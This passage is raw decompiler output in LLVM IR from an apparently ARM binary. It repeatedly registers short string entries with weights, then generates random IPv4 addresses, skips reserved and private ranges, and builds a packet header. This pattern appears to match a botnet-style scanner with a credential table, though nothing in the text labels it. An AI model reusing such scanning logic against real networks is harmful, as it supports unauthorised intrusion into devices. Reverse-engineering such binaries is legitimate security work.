  %v4_105bc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18700.272 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18708.274 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_105cc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18708.274 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18710.276 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_105dc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([6 x i8]* @global_var_18710.276 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18718.278 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_105ec = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([5 x i8]* @global_var_18718.278 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18720.280 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_105fc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([6 x i8]* @global_var_18720.280 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18728.282 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1060c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18728.282 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18738.284 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1061c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18738.284 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18748.286 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1062c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([7 x i8]* @global_var_18748.286 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18750.288 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1063c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([5 x i8]* @global_var_18750.288 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18758.290 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1064c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([9 x i8]* @global_var_18758.290 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1865c.238 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1065c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([5 x i8]* @global_var_1865c.238 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18764.292 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1066c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([8 x i8]* @global_var_18764.292 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1876c.294 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1067c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_1876c.294 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18778.296 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1068c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18778.296 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18694.250 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1069c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18694.250 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18654.236 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_106ac = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18654.236 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18638.228 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_106bc = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18638.228 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18630.226 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_106cc = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18630.226 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18738.284 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_106dc = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18738.284 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18780.298 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_106ec = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18780.298 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18664.240 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_106fc = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint ([5 x i8]* @global_var_18664.240 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_186b4.256 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1070c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint ([7 x i8]* @global_var_186b4.256 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18628.300 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18628.300 to i32), i32* %r1.global-to-local, align 4
  %v5_1071c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_18628.300 to i32), i32 ptrtoint ([5 x i8]* @global_var_18628.300 to i32), i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_18788.302 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18790.304 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1072c = call i32 @function_fffc(i32 ptrtoint ([7 x i8]* @global_var_18788.302 to i32), i32 ptrtoint ([7 x i8]* @global_var_18790.304 to i32), i32 1)
  store i32 %v5_1072c, i32* %r0.global-to-local, align 4
  %v2_10734 = ptrtoint i32* %stack_var_-1866 to i32
  br label %dec_label_pc_1073c

dec_label_pc_1073c:                               ; preds = %dec_label_pc_10e90, %dec_label_pc_102c4
  %stack_var_-1880.0 = phi i32 [ %tmp300, %dec_label_pc_102c4 ], [ %stack_var_-1880.2, %dec_label_pc_10e90 ]
  %v0_10a48 = phi i32 [ %v2_10734, %dec_label_pc_102c4 ], [ %stack_var_-1888.1, %dec_label_pc_10e90 ]
  %stack_var_-1884.0 = phi i16 [ %v5_102bc.le, %dec_label_pc_102c4 ], [ %stack_var_-1884.1, %dec_label_pc_10e90 ]
  store i32 ptrtoint (i32* @global_var_21360.183 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v2_10744 = load i32, i32* @global_var_21360.183, align 4
  store i32 %v2_10744, i32* @r4, align 4
  %v3_10748 = icmp uge i32 %stack_var_-1880.0, %v2_10744
  store i1 %v3_10748, i1* %cpsr_c.global-to-local, align 1
  %v9_10748 = icmp eq i32 %stack_var_-1880.0, %v2_10744
  store i1 %v9_10748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10748, label %dec_label_pc_109cc, label %dec_label_pc_10750

dec_label_pc_10750:                               ; preds = %dec_label_pc_1073c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10754 = ptrtoint i32* %stack_var_-104 to i32
  store i32 0, i32* %stack_var_-52, align 4
  %v2_1075c = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_10760

dec_label_pc_10760:                               ; preds = %bb366, %dec_label_pc_10750
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_10774 = call i32 @function_f700()
  %v1_10774 = trunc i32 %v0_10774 to i16
  store i32 %v0_10774, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23394.88 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* %ip.global-to-local, align 4
  %v2_10780 = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_10780, i32* %r3.global-to-local, align 4
  store i16 %v1_10774, i16* bitcast (i32* @global_var_21334.204 to i16*), align 4
  store i32 %v2_10780, i32* @global_var_2133c.305, align 4
  br label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %dec_label_pc_10860, %dec_label_pc_107bc, %dec_label_pc_10894, %dec_label_pc_10888, %dec_label_pc_1087c, %dec_label_pc_10870, %.thread28, %bb357, %bb356, %bb355, %bb354, %bb353, %dec_label_pc_10858, %dec_label_pc_10850, %bb349, %dec_label_pc_10820, %dec_label_pc_107fc, %bb342, %dec_label_pc_107cc, %bb341, %dec_label_pc_107b4, %bb340, %bb359, %dec_label_pc_10760
  %v0_1078c = call i32 @function_f700()
  store i32 %v0_1078c, i32* %r0.global-to-local, align 4
  %v1_10790 = urem i32 %v0_1078c, 256
  store i32 %v1_10790, i32* %r1.global-to-local, align 4
  %v3_10794 = udiv i32 %v0_1078c, 256
  store i32 %v3_10794, i32* %r3.global-to-local, align 4
  %v3_10798 = udiv i32 %v0_1078c, 65536
  store i32 %v3_10798, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1079c = icmp eq i32 %v1_10790, 0
  store i1 %v2_1079c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1079c, label %bb340, label %bb339

bb339:                                            ; preds = %dec_label_pc_1078c
  %v3_107a0 = icmp ugt i32 %v1_10790, 126
  store i1 %v3_107a0, i1* %cpsr_c.global-to-local, align 1
  %v8_107a0 = icmp eq i32 %v1_10790, 127
  store i1 %v8_107a0, i1* %cpsr_z.global-to-local, align 1
  br label %bb340

bb340:                                            ; preds = %dec_label_pc_1078c, %bb339
  %v0_107b0 = phi i1 [ true, %dec_label_pc_1078c ], [ %v8_107a0, %bb339 ]
  %v1_107a4 = urem i32 %v3_10794, 256
  store i32 %v1_107a4, i32* %ip.global-to-local, align 4
  %v1_107a8 = urem i32 %v3_10798, 256
  store i32 %v1_107a8, i32* %r2.global-to-local, align 4
  %v1_107ac = and i32 %v0_1078c, 8388608
  %v2_107ac = icmp ne i32 %v1_107ac, 0
  store i1 %v2_107ac, i1* %cpsr_c.global-to-local, align 1
  %v3_107ac = udiv i32 %v0_1078c, 16777216
  store i32 %v3_107ac, i32* %r0.global-to-local, align 4
  br i1 %v0_107b0, label %dec_label_pc_1078c, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %bb340
  %v2_107b4 = icmp ugt i32 %v1_10790, 2
  store i1 %v2_107b4, i1* %cpsr_c.global-to-local, align 1
  %v7_107b4 = icmp eq i32 %v1_10790, 3
  store i1 %v7_107b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107b4, label %dec_label_pc_1078c, label %dec_label_pc_107bc

dec_label_pc_107bc:                               ; preds = %dec_label_pc_107b4
  %v1_107bc = add nsw i32 %v1_10790, -15
  store i32 %v1_107bc, i32* %r3.global-to-local, align 4
  %v2_107c0 = icmp ugt i32 %v1_10790, 55
  store i1 %v2_107c0, i1* %cpsr_c.global-to-local, align 1
  %v7_107c0 = icmp eq i32 %v1_10790, 56
  store i1 %v7_107c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107c0, label %dec_label_pc_1078c, label %bb341

bb341:                                            ; preds = %dec_label_pc_107bc
  %v3_107c4 = icmp ne i32 %v1_107bc, 0
  store i1 %v3_107c4, i1* %cpsr_c.global-to-local, align 1
  %v8_107c4 = icmp eq i32 %v1_107bc, 1
  store i1 %v8_107c4, i1* %cpsr_z.global-to-local, align 1
  %v2_107c8 = xor i1 %v3_107c4, true
  %v3_107c8 = or i1 %v8_107c4, %v2_107c8
  br i1 %v3_107c8, label %dec_label_pc_1078c, label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %bb341
  %v2_107cc = icmp ugt i32 %v1_10790, 9
  store i1 %v2_107cc, i1* %cpsr_c.global-to-local, align 1
  %v7_107cc = icmp eq i32 %v1_10790, 10
  store i1 %v7_107cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107cc, label %dec_label_pc_1078c, label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %dec_label_pc_107cc
  %v2_107d4 = icmp ugt i32 %v1_10790, 191
  store i1 %v2_107d4, i1* %cpsr_c.global-to-local, align 1
  %v7_107d4 = icmp eq i32 %v1_10790, 192
  store i1 %v7_107d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107d4, label %bb342, label %dec_label_pc_107e0

bb342:                                            ; preds = %dec_label_pc_107d4
  %v3_107d8 = icmp ugt i32 %v1_107a4, 167
  store i1 %v3_107d8, i1* %cpsr_c.global-to-local, align 1
  %v8_107d8 = icmp eq i32 %v1_107a4, 168
  store i1 %v8_107d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107d8, label %dec_label_pc_1078c, label %dec_label_pc_107e0

dec_label_pc_107e0:                               ; preds = %dec_label_pc_107d4, %bb342
  %v7_107e0 = icmp eq i32 %v1_10790, 172
  %.419 = zext i1 %v7_107e0 to i32
  store i32 %.419, i32* %r3.global-to-local, align 4
  %v2_107ec = icmp ugt i32 %v1_107a4, 14
  store i1 %v2_107ec, i1* %cpsr_c.global-to-local, align 1
  %v7_107ec = icmp eq i32 %v1_107a4, 15
  store i1 %v7_107ec, i1* %cpsr_z.global-to-local, align 1
  %v2_107f0 = xor i1 %v2_107ec, true
  %v3_107f0 = or i1 %v7_107ec, %v2_107f0
  br i1 %v3_107f0, label %.thread6, label %bb345

.thread6:                                         ; preds = %dec_label_pc_107e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10804

bb345:                                            ; preds = %dec_label_pc_107e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107f4 = icmp eq i1 %v7_107e0, false
  store i1 %v2_107f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_107f4, label %dec_label_pc_10804, label %dec_label_pc_107fc

dec_label_pc_107fc:                               ; preds = %bb345
  %v2_107fc = icmp ugt i32 %v1_107a4, 30
  store i1 %v2_107fc, i1* %cpsr_c.global-to-local, align 1
  %v7_107fc = icmp eq i32 %v1_107a4, 31
  store i1 %v7_107fc, i1* %cpsr_z.global-to-local, align 1
  %v2_10800 = xor i1 %v2_107fc, true
  %v3_10800 = or i1 %v7_107fc, %v2_10800
  br i1 %v3_10800, label %dec_label_pc_1078c, label %dec_label_pc_10804

dec_label_pc_10804:                               ; preds = %.thread6, %dec_label_pc_107fc, %bb345
  %v7_10804 = icmp eq i32 %v1_10790, 100
  %.420 = zext i1 %v7_10804 to i32
  store i32 %.420, i32* %r3.global-to-local, align 4
  %v2_10810 = icmp ugt i32 %v1_107a4, 62
  store i1 %v2_10810, i1* %cpsr_c.global-to-local, align 1
  %v7_10810 = icmp eq i32 %v1_107a4, 63
  store i1 %v7_10810, i1* %cpsr_z.global-to-local, align 1
  %v2_10814 = xor i1 %v2_10810, true
  %v3_10814 = or i1 %v7_10810, %v2_10814
  br i1 %v3_10814, label %.thread11, label %bb348

.thread11:                                        ; preds = %dec_label_pc_10804
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10828

bb348:                                            ; preds = %dec_label_pc_10804
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10818 = icmp eq i1 %v7_10804, false
  store i1 %v2_10818, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10818, label %dec_label_pc_10828, label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %bb348
  %v2_10820 = icmp ugt i32 %v1_107a4, 125
  store i1 %v2_10820, i1* %cpsr_c.global-to-local, align 1
  %v7_10820 = icmp eq i32 %v1_107a4, 126
  store i1 %v7_10820, i1* %cpsr_z.global-to-local, align 1
  %v2_10824 = xor i1 %v2_10820, true
  %v3_10824 = or i1 %v7_10820, %v2_10824
  br i1 %v3_10824, label %dec_label_pc_1078c, label %dec_label_pc_10828

dec_label_pc_10828:                               ; preds = %.thread11, %dec_label_pc_10820, %bb348
  %v2_10828 = icmp ugt i32 %v1_10790, 168
  store i1 %v2_10828, i1* %cpsr_c.global-to-local, align 1
  %v7_10828 = icmp eq i32 %v1_10790, 169
  store i1 %v7_10828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10828, label %bb349, label %dec_label_pc_10834

bb349:                                            ; preds = %dec_label_pc_10828
  %v3_1082c = icmp eq i32 %v1_107a4, 255
  store i1 %v3_1082c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_1082c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1082c, label %dec_label_pc_1078c, label %dec_label_pc_10834

dec_label_pc_10834:                               ; preds = %dec_label_pc_10828, %bb349
  %v7_10834 = icmp eq i32 %v1_10790, 198
  %.421 = zext i1 %v7_10834 to i32
  store i32 %.421, i32* %r3.global-to-local, align 4
  %v2_10840 = icmp ugt i32 %v1_107a4, 16
  store i1 %v2_10840, i1* %cpsr_c.global-to-local, align 1
  %v7_10840 = icmp eq i32 %v1_107a4, 17
  store i1 %v7_10840, i1* %cpsr_z.global-to-local, align 1
  %v2_10844 = xor i1 %v2_10840, true
  %v3_10844 = or i1 %v7_10840, %v2_10844
  br i1 %v3_10844, label %.thread17, label %bb352

.thread17:                                        ; preds = %dec_label_pc_10834
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10858

bb352:                                            ; preds = %dec_label_pc_10834
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10848 = icmp eq i1 %v7_10834, false
  store i1 %v2_10848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10848, label %dec_label_pc_10858, label %dec_label_pc_10850

dec_label_pc_10850:                               ; preds = %bb352
  %v2_10850 = icmp ugt i32 %v1_107a4, 18
  store i1 %v2_10850, i1* %cpsr_c.global-to-local, align 1
  %v7_10850 = icmp eq i32 %v1_107a4, 19
  store i1 %v7_10850, i1* %cpsr_z.global-to-local, align 1
  %v2_10854 = xor i1 %v2_10850, true
  %v3_10854 = or i1 %v7_10850, %v2_10854
  br i1 %v3_10854, label %dec_label_pc_1078c, label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %.thread17, %dec_label_pc_10850, %bb352
  %v2_10858 = icmp ugt i32 %v1_10790, 222
  store i1 %v2_10858, i1* %cpsr_c.global-to-local, align 1
  %v7_10858 = icmp eq i32 %v1_10790, 223
  store i1 %v7_10858, i1* %cpsr_z.global-to-local, align 1
  %v2_1085c = xor i1 %v7_10858, true
  %v3_1085c = and i1 %v2_10858, %v2_1085c
  br i1 %v3_1085c, label %dec_label_pc_1078c, label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %dec_label_pc_10858
  %v1_10860 = add nsw i32 %v1_10790, -6
  store i32 %v1_10860, i32* %r3.global-to-local, align 4
  %v2_10864 = icmp ugt i32 %v1_10790, 10
  store i1 %v2_10864, i1* %cpsr_c.global-to-local, align 1
  %v7_10864 = icmp eq i32 %v1_10790, 11
  store i1 %v7_10864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10864, label %dec_label_pc_1078c, label %bb353

bb353:                                            ; preds = %dec_label_pc_10860
  %v3_10868 = icmp ne i32 %v1_10860, 0
  store i1 %v3_10868, i1* %cpsr_c.global-to-local, align 1
  %v8_10868 = icmp eq i32 %v1_10860, 1
  store i1 %v8_10868, i1* %cpsr_z.global-to-local, align 1
  %v2_1086c = xor i1 %v3_10868, true
  %v3_1086c = or i1 %v8_10868, %v2_1086c
  br i1 %v3_1086c, label %dec_label_pc_1078c, label %dec_label_pc_10870

dec_label_pc_10870:                               ; preds = %bb353
  %v2_10870 = icmp ugt i32 %v1_10790, 21
  store i1 %v2_10870, i1* %cpsr_c.global-to-local, align 1
  %v7_10870 = icmp eq i32 %v1_10790, 22
  store i1 %v7_10870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10870, label %dec_label_pc_1078c, label %bb354

bb354:                                            ; preds = %dec_label_pc_10870
  %v3_10874 = icmp ugt i32 %v1_10790, 20
  store i1 %v3_10874, i1* %cpsr_c.global-to-local, align 1
  %v8_10874 = icmp eq i32 %v1_10790, 21
  store i1 %v8_10874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10874, label %dec_label_pc_1078c, label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %bb354
  %v2_1087c = icmp ugt i32 %v1_10790, 27
  store i1 %v2_1087c, i1* %cpsr_c.global-to-local, align 1
  %v7_1087c = icmp eq i32 %v1_10790, 28
  store i1 %v7_1087c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1087c, label %dec_label_pc_1078c, label %bb355

bb355:                                            ; preds = %dec_label_pc_1087c
  %v3_10880 = icmp ugt i32 %v1_10790, 25
  store i1 %v3_10880, i1* %cpsr_c.global-to-local, align 1
  %v8_10880 = icmp eq i32 %v1_10790, 26
  store i1 %v8_10880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10880, label %dec_label_pc_1078c, label %dec_label_pc_10888

dec_label_pc_10888:                               ; preds = %bb355
  %v2_10888 = icmp ugt i32 %v1_10790, 29
  store i1 %v2_10888, i1* %cpsr_c.global-to-local, align 1
  %v7_10888 = icmp eq i32 %v1_10790, 30
  store i1 %v7_10888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10888, label %dec_label_pc_1078c, label %bb356

bb356:                                            ; preds = %dec_label_pc_10888
  %v3_1088c = icmp ugt i32 %v1_10790, 28
  store i1 %v3_1088c, i1* %cpsr_c.global-to-local, align 1
  %v8_1088c = icmp eq i32 %v1_10790, 29
  store i1 %v8_1088c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1088c, label %dec_label_pc_1078c, label %dec_label_pc_10894

dec_label_pc_10894:                               ; preds = %bb356
  %v2_10894 = icmp ugt i32 %v1_10790, 54
  store i1 %v2_10894, i1* %cpsr_c.global-to-local, align 1
  %v7_10894 = icmp eq i32 %v1_10790, 55
  store i1 %v7_10894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10894, label %dec_label_pc_1078c, label %bb357

bb357:                                            ; preds = %dec_label_pc_10894
  %v3_10898 = icmp ugt i32 %v1_10790, 32
  store i1 %v3_10898, i1* %cpsr_c.global-to-local, align 1
  %v8_10898 = icmp eq i32 %v1_10790, 33
  store i1 %v8_10898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10898, label %dec_label_pc_1078c, label %dec_label_pc_108a0

dec_label_pc_108a0:                               ; preds = %bb357
  %v2_108a0 = icmp ugt i32 %v1_10790, 214
  store i1 %v2_108a0, i1* %cpsr_c.global-to-local, align 1
  %v7_108a0 = icmp eq i32 %v1_10790, 215
  store i1 %v7_108a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108a0, label %.thread28, label %bb358

bb358:                                            ; preds = %dec_label_pc_108a0
  %v3_108a4 = icmp ugt i32 %v1_10790, 213
  store i1 %v3_108a4, i1* %cpsr_c.global-to-local, align 1
  %v8_108a4 = icmp eq i32 %v1_10790, 214
  store i1 %v8_108a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_108a4, label %bb359, label %dec_label_pc_108b4

.thread28:                                        ; preds = %dec_label_pc_108a0
  br label %dec_label_pc_1078c

bb359:                                            ; preds = %bb358
  br label %dec_label_pc_1078c

dec_label_pc_108b4:                               ; preds = %bb358
  %v5_108c0 = call i32 @llvm.bswap.i32(i32 %v0_1078c)
  store i32 %v5_108c0, i32* %r3.global-to-local, align 4
  %tmp360 = and i32 %v0_1078c, 65280
  %tmp361 = call i32 @llvm.bswap.i32(i32 %tmp360)
  %v3_108c8 = udiv i32 %v5_108c0, 16777216
  %tmp362 = and i32 %v0_1078c, 16711680
  %tmp363 = call i32 @llvm.bswap.i32(i32 %tmp362)
  %v4_108d0 = udiv i32 %tmp361, 256
  %v4_108d4 = mul nuw nsw i32 %tmp363, 256
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* @r0, align 4
  %tmp364 = and i32 %v0_1078c, 65536
  %v3_108dc = icmp ne i32 %tmp364, 0
  store i1 %v3_108dc, i1* %cpsr_c.global-to-local, align 1
  %v4_108dc = mul i32 %v5_108c0, 16777216
  %v5_108d0 = or i32 %v4_108dc, %v3_108c8
  %v5_108d4 = or i32 %v5_108d0, %v4_108d0
  %v5_108dc = or i32 %v5_108d4, %v4_108d4
  store i32 %v5_108dc, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_2133a.306 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_108dc, i32* @global_var_21340.307, align 4
  %v3_108ec = call i32 @function_dc98(i32 ptrtoint (i8** @global_var_21330.198 to i32), i32 20)
  %v4_108ec = trunc i32 %v3_108ec to i16
  store i32 %v3_108ec, i32* %r0.global-to-local, align 4
  %v3_108f0 = load i32, i32* %stack_var_-52, align 4
  %v5_10900 = sdiv i32 %v3_108f0, 10
  %v3_10904 = mul i32 %v5_10900, 8
  store i32 %v3_10904, i32* %r2.global-to-local, align 4
  %v2_1090c = mul i32 %v5_10900, 10
  store i32 %v2_1090c, i32* %r3.global-to-local, align 4
  %v3_10910 = icmp uge i32 %v3_108f0, %v2_1090c
  store i1 %v3_10910, i1* %cpsr_c.global-to-local, align 1
  %v9_10910 = icmp eq i32 %v3_108f0, %v2_1090c
